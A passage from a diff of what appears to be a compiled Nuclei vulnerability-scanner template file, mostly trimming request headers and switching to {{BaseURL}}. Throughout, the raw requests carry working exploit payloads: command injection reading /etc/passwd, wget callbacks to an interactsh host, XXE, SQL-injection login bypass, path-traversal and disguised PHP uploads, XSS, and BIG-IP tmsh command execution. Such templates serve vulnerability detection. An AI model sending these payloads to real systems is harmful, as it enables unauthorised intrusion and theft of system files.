+            "GET /card_scan.php?No=30&ReaderNo=%60cat%20/etc/passwd%20%3E%20nuclei.txt%60 HTTP/1.1\nHost: {{Hostname}}\n",
+            "GET /nuclei.txt HTTP/1.1\nHost: {{Hostname}}\n"
           ]
         }
       ]
@@ -15454,8 +15562,7 @@
         {
           "body": "{\"sheet\":[\".es(*)\"],\"time\":{\"from\":\"now-1m\",\"to\":\"now\",\"mode\":\"quick\",\"interval\":\"auto\",\"timezone\":\"Asia/Shanghai\"}}",
           "headers": {
-            "Content-Type": "application/json; charset=utf-8",
-            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55"
+            "Content-Type": "application/json; charset=utf-8"
           },
           "matchers": [
             {
@@ -15469,7 +15576,7 @@
               "part": "header",
               "type": "word",
               "words": [
-                "Content-Type: application/json"
+                "application/json"
               ]
             },
             {
@@ -15843,7 +15950,7 @@
             }
           ],
           "raw": [
-            "POST /Autodiscover/Autodiscover.xml HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0\nContent-Type: application/xml\n\n<!DOCTYPE xxe [\n<!ELEMENT name ANY >\n<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>\n<Autodiscover xmlns=\"http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a\">\n<Request>\n<EMailAddress>aaaaa</EMailAddress>\n<AcceptableResponseSchema>&xxe;</AcceptableResponseSchema>\n</Request>\n</Autodiscover>\n"
+            "POST /Autodiscover/Autodiscover.xml HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/xml\n\n<!DOCTYPE xxe [\n<!ELEMENT name ANY >\n<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>\n<Autodiscover xmlns=\"http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a\">\n<Request>\n<EMailAddress>aaaaa</EMailAddress>\n<AcceptableResponseSchema>&xxe;</AcceptableResponseSchema>\n</Request>\n</Autodiscover>\n"
           ]
         }
       ]
@@ -15881,7 +15988,7 @@
           ],
           "matchers-condition": "and",
           "raw": [
-            "POST /artifactory/ui/auth/login?_spring_security_remember_me=false HTTP/1.1\nHost: {{Hostname}}\nContent-Length: 60\nAccept: application/json, text/plain, */*\nX-Requested-With: artUI\nserial: 58\nX-Forwarded-For: 127.0.0.1\nRequest-Agent: artifactoryUI\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36\nContent-Type: application/json\nOrigin: http://{{Hostname}}\nReferer: http://{{Hostname}}/artifactory/webapp/\nAccept-Language: en-US,en;q=0.9\nConnection: close\n\n{\"user\":\"access-admin\",\"password\":\"password\",\"type\":\"login\"}\n"
+            "POST /artifactory/ui/auth/login?_spring_security_remember_me=false HTTP/1.1\nHost: {{Hostname}}\nAccept: application/json, text/plain, */*\nX-Requested-With: artUI\nX-Forwarded-For: 127.0.0.1\nRequest-Agent: artifactoryUI\nContent-Type: application/json\nOrigin: {{BaseURL}}\nReferer: {{BaseURL}}/artifactory/webapp/\n\n{\"user\":\"access-admin\",\"password\":\"password\",\"type\":\"login\"}\n"
           ]
         }
       ]
@@ -16603,10 +16710,10 @@
           ],
           "matchers-condition": "and",
           "raw": [
-            "GET /api/experimental/test HTTP/1.1\nHost: {{Hostname}}\nConnection: close\nAccept-Encoding: gzip, deflate\nAccept: */*\n",
-            "GET /api/experimental/dags/example_trigger_target_dag/paused/false HTTP/1.1\nHost: {{Hostname}}\nConnection: close\nAccept-Encoding: gzip, deflate\nAccept: */*\n",
-            "POST /api/experimental/dags/example_trigger_target_dag/dag_runs HTTP/1.1\nHost: {{Hostname}}\nConnection: close\nAccept-Encoding: gzip, deflate\nAccept: */*\nContent-Length: 85\nContent-Type: application/json\n\n{\"conf\": {\"message\": \"\\\"; touch test #\"}}\n",
-            "GET /api/experimental/dags/example_trigger_target_dag/dag_runs/{{exec_date}}/tasks/bash_task HTTP/1.1\nHost: {{Hostname}}\nConnection: close\nAccept-Encoding: gzip, deflate\nAccept: */*\n"
+            "GET /api/experimental/test HTTP/1.1\nHost: {{Hostname}}\nAccept: */*\n",
+            "GET /api/experimental/dags/example_trigger_target_dag/paused/false HTTP/1.1\nHost: {{Hostname}}\nAccept: */*\n",
+            "POST /api/experimental/dags/example_trigger_target_dag/dag_runs HTTP/1.1\nHost: {{Hostname}}\nAccept: */*\nContent-Type: application/json\n\n{\"conf\": {\"message\": \"\\\"; touch test #\"}}\n",
+            "GET /api/experimental/dags/example_trigger_target_dag/dag_runs/{{exec_date}}/tasks/bash_task HTTP/1.1\nHost: {{Hostname}}\nAccept: */*\n"
           ],
           "req-condition": true
         }
@@ -16756,7 +16863,7 @@
             }
           ],
           "raw": [
-            "POST /ajax/api/content_infraction/getIndexableContent HTTP/1.1\nHost: {{Hostname}}\nAccept: */*\nConnection: keep-alive\nX-Requested-With: XMLHttpRequest\nContent-Length: 218\nContent-Type: application/x-www-form-urlencoded\n\nnodeId%5Bnodeid%5D=1%20union%20select%201%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2CCONCAT%28%27vbulletin%27%2C%27rce%27%2C%40%40version%29%2C19%2C20%2C21%2C22%2C23%2C24%2C25%2C26%2C27--+-\n"
+            "POST /ajax/api/content_infraction/getIndexableContent HTTP/1.1\nHost: {{Hostname}}\nX-Requested-With: XMLHttpRequest\nAccept: */*\nContent-Type: application/x-www-form-urlencoded\n\nnodeId%5Bnodeid%5D=1%20union%20select%201%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2CCONCAT%28%27vbulletin%27%2C%27rce%27%2C%40%40version%29%2C19%2C20%2C21%2C22%2C23%2C24%2C25%2C26%2C27--+-\n"
           ]
         }
       ]
@@ -16847,9 +16954,7 @@
       "requests": [
         {
           "headers": {
-            "Connection": "close",
-            "Referer": "http://{{Hostname}}/webadmin/admin/service_manager_data.php",
-            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko)"
+            "Referer": "{{BaseURL}}/webadmin/admin/service_manager_data.php"
           },
           "matchers": [
             {
@@ -17610,8 +17715,8 @@
           ],
           "matchers-condition": "and",
           "raw": [
-            "GET /include/exportUser.php?type=3&cla=application&func=_exec&opt=(cat%20/etc/passwd)%3Enuclei.txt HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0\nContent-Type: application/x-www-form-urlencoded\n",
-            "GET /include/nuclei.txt HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0\nContent-Type: application/x-www-form-urlencoded\n"
+            "GET /include/exportUser.php?type=3&cla=application&func=_exec&opt=(cat%20/etc/passwd)%3Enuclei.txt HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n",
+            "GET /include/nuclei.txt HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n"
           ]
         }
       ]
@@ -17686,7 +17791,7 @@
           ],
           "matchers-condition": "and",
           "raw": [
-            "POST /localmenus.cgi?func=609&rphl=1&data=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0\n"
+            "POST /localmenus.cgi?func=609&rphl=1&data=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA HTTP/1.1\nHost: {{Hostname}}\n"
           ]
         }
       ]
@@ -17947,8 +18052,8 @@
           ],
           "matchers-condition": "and",
           "raw": [
-            "GET /fw.login.php?apikey=%27UNION%20select%201,%27YToyOntzOjM6InVpZCI7czo0OiItMTAwIjtzOjIyOiJBQ1RJVkVfRElSRUNUT1JZX0lOREVYIjtzOjE6IjEiO30=%27; HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0\nAccept: */*\nConnection: close\n",
-            "GET /cyrus.index.php?service-cmds-peform=%7C%7Cwhoami%7C%7C HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0\nAccept: */*\nConnection: close\n"
+            "GET /fw.login.php?apikey=%27UNION%20select%201,%27YToyOntzOjM6InVpZCI7czo0OiItMTAwIjtzOjIyOiJBQ1RJVkVfRElSRUNUT1JZX0lOREVYIjtzOjE6IjEiO30=%27; HTTP/1.1\nHost: {{Hostname}}\nAccept: */*\n",
+            "GET /cyrus.index.php?service-cmds-peform=%7C%7Cwhoami%7C%7C HTTP/1.1\nHost: {{Hostname}}\nAccept: */*\n"
           ]
         }
       ]
@@ -18021,7 +18126,7 @@
       "requests": [
         {
           "raw": [
-            "POST /jars/upload HTTP/1.1\nHost: {{Hostname}}\nAccept: */*\nAccept-Language: en\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryoZ8meKnrrso89R6Y\nContent-Length: 187\n\n------WebKitFormBoundaryoZ8meKnrrso89R6Y\nContent-Disposition: form-data; name=\"jarfile\"; filename=\"../../../../../../../tmp/poc\"\n\ntest-poc\n------WebKitFormBoundaryoZ8meKnrrso89R6Y--\n"
+            "POST /jars/upload HTTP/1.1\nHost: {{Hostname}}\nAccept: */*\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryoZ8meKnrrso89R6Y\n\n------WebKitFormBoundaryoZ8meKnrrso89R6Y\nContent-Disposition: form-data; name=\"jarfile\"; filename=\"../../../../../../../tmp/poc\"\n\ntest-poc\n------WebKitFormBoundaryoZ8meKnrrso89R6Y--\n"
           ]
         },
         {
@@ -18572,8 +18677,8 @@
           ],
           "matchers-condition": "and",
           "raw": [
-            "GET /?p=1 HTTP/1.1\nHost: {{Hostname}}\nAccept: */*\nConnection: close\n",
-            "POST /wp-admin/admin-ajax.php HTTP/1.1\nHost: {{Hostname}}\nContent-Length: 745\nAccept: */*\nX-Requested-With: XMLHttpRequest\nsec-ch-ua-mobile: ?0\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundary88AhjLimsDMHU1Ak\nOrigin: {{BaseURL}}\nSec-Fetch-Site: same-origin\nSec-Fetch-Mode: cors\nSec-Fetch-Dest: empty\nReferer: {{BaseURL}}\nAccept-Encoding: gzip, deflate\nAccept-Language: en-GB,en-US;q=0.9,en;q=0.8\nConnection: close\n\n------WebKitFormBoundary88AhjLimsDMHU1Ak\nContent-Disposition: form-data; name=\"action\"\n\nwmuUploadFiles\n------WebKitFormBoundary88AhjLimsDMHU1Ak\nContent-Disposition: form-data; name=\"wmu_nonce\"\n\n{{wmuSecurity}}\n------WebKitFormBoundary88AhjLimsDMHU1Ak\nContent-Disposition: form-data; name=\"wmuAttachmentsData\"\n\nundefined\n------WebKitFormBoundary88AhjLimsDMHU1Ak\nContent-Disposition: form-data; name=\"wmu_files[0]\"; filename=\"rce.php\"\nContent-Type: image/png\n\n{{base64_decode('/9j/4WpFeGlmTU0q/f39af39Pv39/f39/f39/f2o/f39/cD9/f39/f39/f39/f/g/UpGSUb9/f39/9tD/f0M/QwK/f0=')}}\n<?php phpinfo();?>\n------WebKitFormBoundary88AhjLimsDMHU1Ak\nContent-Disposition: form-data; name=\"postId\"\n\n1\n------WebKitFormBoundary88AhjLimsDMHU1Ak--\n"
+            "GET /?p=1 HTTP/1.1\nHost: {{Hostname}}\nAccept: */*\n",
+            "POST /wp-admin/admin-ajax.php HTTP/1.1\nHost: {{Hostname}}\nX-Requested-With: XMLHttpRequest\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundary88AhjLimsDMHU1Ak\nOrigin: {{BaseURL}}\nReferer: {{BaseURL}}\n\n------WebKitFormBoundary88AhjLimsDMHU1Ak\nContent-Disposition: form-data; name=\"action\"\n\nwmuUploadFiles\n------WebKitFormBoundary88AhjLimsDMHU1Ak\nContent-Disposition: form-data; name=\"wmu_nonce\"\n\n{{wmuSecurity}}\n------WebKitFormBoundary88AhjLimsDMHU1Ak\nContent-Disposition: form-data; name=\"wmuAttachmentsData\"\n\nundefined\n------WebKitFormBoundary88AhjLimsDMHU1Ak\nContent-Disposition: form-data; name=\"wmu_files[0]\"; filename=\"rce.php\"\nContent-Type: image/png\n\n{{base64_decode('/9j/4WpFeGlmTU0q/f39af39Pv39/f39/f39/f2o/f39/cD9/f39/f39/f39/f/g/UpGSUb9/f39/9tD/f0M/QwK/f0=')}}\n<?php phpinfo();?>\n------WebKitFormBoundary88AhjLimsDMHU1Ak\nContent-Disposition: form-data; name=\"postId\"\n\n1\n------WebKitFormBoundary88AhjLimsDMHU1Ak--\n"
           ]
         }
       ]
@@ -18764,8 +18869,8 @@
           ],
           "matchers-condition": "and",
           "raw": [
-            "POST / HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: id,en-US;q=0.7,en;q=0.3\nDNT: 1\nConnection: close\nCookie: uid=6gPjT2ipmNz\nUpgrade-Insecure-Requests: 1\nContent-Length: 0\n\nusername=admin&password=6b86b273ff34fce19d6b804eff5a3f5747ada4eaa22f1d49c01e52ddb7875b4b\n",
-            "GET /cgi-bin/execute_cmd.cgi?timestamp=1589333279490&cmd=cat%20/etc/passwd HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: id,en-US;q=0.7,en;q=0.3\nDNT: 1\nConnection: close\nCookie: uid=6gPjT2ipmNz\nUpgrade-Insecure-Requests: 1\nContent-Length: 0\n"
+            "POST / HTTP/1.1\nHost: {{Hostname}}\nCookie: uid=6gPjT2ipmNz\n\nusername=admin&password=6b86b273ff34fce19d6b804eff5a3f5747ada4eaa22f1d49c01e52ddb7875b4b\n",
+            "GET /cgi-bin/execute_cmd.cgi?timestamp=1589333279490&cmd=cat%20/etc/passwd HTTP/1.1\nHost: {{Hostname}}\nCookie: uid=6gPjT2ipmNz\n"
           ]
         }
       ]
@@ -18888,7 +18993,7 @@
           ],
           "matchers-condition": "and",
           "raw": [
-            "POST /wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php HTTP/1.1\nHost: {{Hostname}}\nAccept: */*\nContent-Length: 608\nContent-Type: multipart/form-data; boundary=------------------------ca81ac1fececda48\nConnection: close\n\n--------------------------ca81ac1fececda48\nContent-Disposition: form-data; name=\"reqid\"\n\n17457a1fe6959\n--------------------------ca81ac1fececda48\nContent-Disposition: form-data; name=\"cmd\"\n\nupload\n--------------------------ca81ac1fececda48\nContent-Disposition: form-data; name=\"target\"\n\nl1_Lw\n--------------------------ca81ac1fececda48\nContent-Disposition: form-data; name=\"mtime[]\"\n\n1576045135\n--------------------------ca81ac1fececda48\nContent-Disposition: form-data; name=\"upload[]\"; filename=\"poc.txt\"\nContent-Type: text/plain\n\npoc-test\n--------------------------ca81ac1fececda48--\n"
+            "POST /wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php HTTP/1.1\nHost: {{Hostname}}\nAccept: */*\nContent-Type: multipart/form-data; boundary=------------------------ca81ac1fececda48\n\n--------------------------ca81ac1fececda48\nContent-Disposition: form-data; name=\"reqid\"\n\n17457a1fe6959\n--------------------------ca81ac1fececda48\nContent-Disposition: form-data; name=\"cmd\"\n\nupload\n--------------------------ca81ac1fececda48\nContent-Disposition: form-data; name=\"target\"\n\nl1_Lw\n--------------------------ca81ac1fececda48\nContent-Disposition: form-data; name=\"mtime[]\"\n\n1576045135\n--------------------------ca81ac1fececda48\nContent-Disposition: form-data; name=\"upload[]\"; filename=\"poc.txt\"\nContent-Type: text/plain\n\npoc-test\n--------------------------ca81ac1fececda48--\n"
           ]
         }
       ]
@@ -18989,8 +19094,8 @@
             }
           ],
           "raw": [
-            "POST /cgi-bin/system_mgr.cgi? HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0\nAccept: */*\nConnection: close\n\nC1=ON&cmd=cgi_ntp_time&f_ntp_server=`wget http://{{interactsh-url}}`\n",
-            "POST /cgi-bin/system_mgr.cgi?C1=ON&cmd=cgi_ntp_time&f_ntp_server=`wget http://{{interactsh-url}}` HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0\nAccept: */*\nConnection: close\n"
+            "POST /cgi-bin/system_mgr.cgi? HTTP/1.1\nHost: {{Hostname}}\nAccept: */*\n\nC1=ON&cmd=cgi_ntp_time&f_ntp_server=`wget http://{{interactsh-url}}`\n",
+            "POST /cgi-bin/system_mgr.cgi?C1=ON&cmd=cgi_ntp_time&f_ntp_server=`wget http://{{interactsh-url}}` HTTP/1.1\nHost: {{Hostname}}\nAccept: */*\n"
           ]
         }
       ]
@@ -19232,7 +19337,7 @@
             }
           ],
           "raw": [
-            "POST /login.htm HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0\nAccept: */*\nConnection: close\n\nsubmitId=debug&debugCmd=wget+http://{{interactsh-url}}&submitEnd=\n"
+            "POST /login.htm HTTP/1.1\nHost: {{Hostname}}\nAccept: */*\n\nsubmitId=debug&debugCmd=wget+http://{{interactsh-url}}&submitEnd=\n"
           ]
         }
       ]
@@ -19503,7 +19608,8 @@
             }
           ],
           "raw": [
-            "GET /include/makecvs.php?Event=%60wget%20http%3A%2F%2F{{interactsh-url}}%60 HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36\nAccept-Encoding: gzip, deflate\nAccept: */*\nConnection: keep-alive\n\nGET /tos/index.php?explorer/pathList&path=%60wget%20http%3A%2F%2F{{interactsh-url}}%60 HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36\nAccept-Encoding: gzip, deflate\nAccept: */*\nConnection: keep-alive\n"
+            "GET /include/makecvs.php?Event=%60wget%20http%3A%2F%2F{{interactsh-url}}%60 HTTP/1.1\nHost: {{Hostname}}\n",
+            "GET /tos/index.php?explorer/pathList&path=%60wget%20http%3A%2F%2F{{interactsh-url}}%60 HTTP/1.1\nHost: {{Hostname}}\n"
           ]
         }
       ]
@@ -19539,7 +19645,7 @@
           ],
           "matchers-condition": "and",
           "raw": [
-            "POST /api/v1/method.callAnon/sendForgotPasswordEmail HTTP/1.1\nHost: {{Hostname}}\nOrigin: {{BaseURL}}\nX-Requested-With: XMLHttpRequest\nContent-Type: application/json\nUser-Agent: Ophion SecurityGroup\nAccept-Language: en-US,en;q=0.9\n\n{\"message\":\"{\\\"msg\\\":\\\"method\\\",\\\"method\\\":\\\"sendForgotPasswordEmail\\\",\\\"params\\\":[\\\"user@local.email\\\"],\\\"id\\\":\\\"3\\\"}\"}\n"
+            "POST /api/v1/method.callAnon/sendForgotPasswordEmail HTTP/1.1\nHost: {{Hostname}}\nOrigin: {{BaseURL}}\nContent-Type: application/json\n\n{\"message\":\"{\\\"msg\\\":\\\"method\\\",\\\"method\\\":\\\"sendForgotPasswordEmail\\\",\\\"params\\\":[\\\"user@local.email\\\"],\\\"id\\\":\\\"3\\\"}\"}\n"
           ]
         }
       ]
@@ -20070,7 +20176,7 @@
             }
           ],
           "raw": [
-            "POST /goform/setSysAdm HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0\nAccept-Encoding: gzip, deflate\nAccept: */*\nConnection: keep-alive\nOrigin: http://{{Hostname}}\nReferer: http://{{Hostname}}/login.shtml\n\nadmuser=admin&admpass=;wget http://{{interactsh-url}};&admpasshint=61646D696E=&AuthTimeout=600&wirelessMgmt_http=1\n"
+            "POST /goform/setSysAdm HTTP/1.1\nHost: {{Hostname}}\nAccept: */*\nOrigin: {{BaseURL}}\nReferer: {{BaseURL}}/login.shtml\n\nadmuser=admin&admpass=;wget http://{{interactsh-url}};&admpasshint=61646D696E=&AuthTimeout=600&wirelessMgmt_http=1\n"
           ]
         }
       ]
@@ -20221,7 +20327,7 @@
           ],
           "matchers-condition": "and",
           "raw": [
-            "POST /+CSCOE+/saml/sp/acs?tgname=a HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 44\n\nSAMLResponse=%22%3E%3Csvg/onload=alert(/{{randstr}}/)%3E\n"
+            "POST /+CSCOE+/saml/sp/acs?tgname=a HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\nSAMLResponse=%22%3E%3Csvg/onload=alert(/{{randstr}}/)%3E\n"
           ]
         }
       ]
@@ -20370,10 +20476,10 @@
           ],
           "matchers-condition": "and",
           "raw": [
-            "GET /wp-content/plugins/quiz-master-next/README.md HTTP/1.1\nHost: {{Hostname}}\nAccept-Encoding: gzip, deflate\nAccept: */*\nAccept-Language: en\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36\nConnection: close\n",
-            "GET /wp-content/plugins/quiz-master-next/tests/_support/AcceptanceTester.php HTTP/1.1\nHost: {{Hostname}}\nAccept-Encoding: gzip, deflate\nAccept: */*\nAccept-Language: en\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36\nConnection: close\n",
-            "POST /wp-admin/admin-ajax.php HTTP/1.1\nHost: {{Hostname}}\nContent-Length: 269\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.192 Safari/537.36\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryBJ17hSJBjuGrnW92\nAccept: */*\nAccept-Language: en-US,en;q=0.9\nConnection: close\n\n------WebKitFormBoundaryBJ17hSJBjuGrnW92\nContent-Disposition: form-data; name=\"action\"\n\nqsm_remove_file_fd_question\n------WebKitFormBoundaryBJ17hSJBjuGrnW92\nContent-Disposition: form-data; name=\"file_url\"\n\n{{fullpath}}wp-content/plugins/quiz-master-next/README.md\n------WebKitFormBoundaryBJ17hSJBjuGrnW92--\n",
-            "GET /wp-content/plugins/quiz-master-next/README.md HTTP/1.1\nHost: {{Hostname}}\nAccept-Encoding: gzip, deflate\nAccept: */*\nAccept-Language: en\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36\nConnection: close\n"
+            "GET /wp-content/plugins/quiz-master-next/README.md HTTP/1.1\nHost: {{Hostname}}\n",
+            "GET /wp-content/plugins/quiz-master-next/tests/_support/AcceptanceTester.php HTTP/1.1\nHost: {{Hostname}}\n",
+            "POST /wp-admin/admin-ajax.php HTTP/1.1\nHost: {{Hostname}}\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryBJ17hSJBjuGrnW92\n\n\n------WebKitFormBoundaryBJ17hSJBjuGrnW92\nContent-Disposition: form-data; name=\"action\"\n\nqsm_remove_file_fd_question\n------WebKitFormBoundaryBJ17hSJBjuGrnW92\nContent-Disposition: form-data; name=\"file_url\"\n\n{{fullpath}}wp-content/plugins/quiz-master-next/README.md\n------WebKitFormBoundaryBJ17hSJBjuGrnW92--\n",
+            "GET /wp-content/plugins/quiz-master-next/README.md HTTP/1.1\nHost: {{Hostname}}\n"
           ],
           "req-condition": true
         }
@@ -20406,7 +20512,7 @@
             }
           ],
           "raw": [
-            "GET /ebook/bookPerPub.php?pubid=4' HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nDNT: 1\nConnection: close\nCookie: PHPSESSID=c4qd3glr3oe6earuf88sub6g1n\nUpgrade-Insecure-Requests: 1\n"
+            "GET /ebook/bookPerPub.php?pubid=4' HTTP/1.1\nHost: {{Hostname}}\n"
           ]
         }
       ]
@@ -20574,7 +20680,7 @@
           ],
           "matchers-condition": "and",
           "raw": [
-            "POST /dfsms/ HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\nConnection: close\nContent-Length: 66\n\nusername=admin%27+or+%271%27+%3D+%271%27%3B+--+-&password=A&login=\n"
+            "POST /dfsms/ HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\nusername=admin%27+or+%271%27+%3D+%271%27%3B+--+-&password=A&login=\n"
           ]
         }
       ]
@@ -20831,7 +20937,6 @@
             },
             {
               "condition": "or",
-              "part": "body",
               "regex": [
                 "root:.*:0:0:",
                 "BIG-IP release ([\\d.]+)",
@@ -20867,10 +20972,10 @@
           ],
           "matchers-condition": "and",
           "raw": [
-            "POST /tmui/locallb/workspace/tmshCmd.jsp HTTP/1.1\nHost: {{Hostname}}\nConnection: close\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko)\n\ncommand=create%20cli%20alias%20private%20list%20command%20bash\n",
-            "POST /tmui/locallb/workspace/fileSave.jsp HTTP/1.1\nHost: {{Hostname}}\nConnection: close\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko)\n\nfileName=%2Ftmp%2Fnonexistent&content=echo%20%27aDNsbDBfdzBSbGQK%27%20%7C%20base64%20-d\n",
-            "POST /tmui/locallb/workspace/tmshCmd.jsp HTTP/1.1\nHost: {{Hostname}}\nConnection: close\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko)\n\ncommand=list%20%2Ftmp%2Fnonexistent\n",
-            "POST /tmui/locallb/workspace/tmshCmd.jsp HTTP/1.1\nHost: {{Hostname}}\nConnection: close\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko)\n\ncommand=delete%20cli%20alias%20private%20list\n"
+            "POST /tmui/locallb/workspace/tmshCmd.jsp HTTP/1.1\nHost: {{Hostname}}\n\ncommand=create%20cli%20alias%20private%20list%20command%20bash\n",
+            "POST /tmui/locallb/workspace/fileSave.jsp HTTP/1.1\nHost: {{Hostname}}\n\nfileName=%2Ftmp%2Fnonexistent&content=echo%20%27aDNsbDBfdzBSbGQK%27%20%7C%20base64%20-d\n",
+            "POST /tmui/locallb/workspace/tmshCmd.jsp HTTP/1.1\nHost: {{Hostname}}\n\ncommand=list%20%2Ftmp%2Fnonexistent\n",
+            "POST /tmui/locallb/workspace/tmshCmd.jsp HTTP/1.1\nHost: {{Hostname}}\n\ncommand=delete%20cli%20alias%20private%20list\n"
           ]
         }
       ]
@@ -21266,7 +21371,7 @@
             }
           ],
           "raw": [
-            "GET /zimlet/com_zimbra_webex/httpPost.jsp?companyId=http://{{interactsh-url}}%23 HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36\nAccept-Encoding: gzip, deflate\nAccept: */*\n"
+            "GET /zimlet/com_zimbra_webex/httpPost.jsp?companyId=http://{{interactsh-url}}%23 HTTP/1.1\nHost: {{Hostname}}\n"
           ]
         }
       ]
@@ -21278,6 +21383,7 @@
         "description": "Deserialization of Untrusted Data in Liferay Portal prior to 7.2.1 CE GA2 allows remote attackers to execute arbitrary code via JSON web services (JSONWS).",
         "name": "Liferay Portal Unauthenticated RCE",
         "reference": [
+          "https://www.synacktiv.com/en/publications/how-to-exploit-liferay-cve-2020-7961-quick-journey-to-poc.html",
           "https://codewhitesec.blogspot.com/2020/03/liferay-portal-json-vulns.html",
           "https://portal.liferay.dev/learn/security/known-vulnerabilities/-/asset_publisher/HbL5mxmVrnXW/content/id/117954271"
         ],
@@ -21299,8 +21405,6 @@
           ],
           "matchers": [
             {
-              "condition": "or",
-              "part": "body",
               "regex": [
                 "OS Name:.*Microsoft Windows",
                 "Distributor ID:"
@@ -21322,7 +21426,7 @@
             ]
           },
           "raw": [
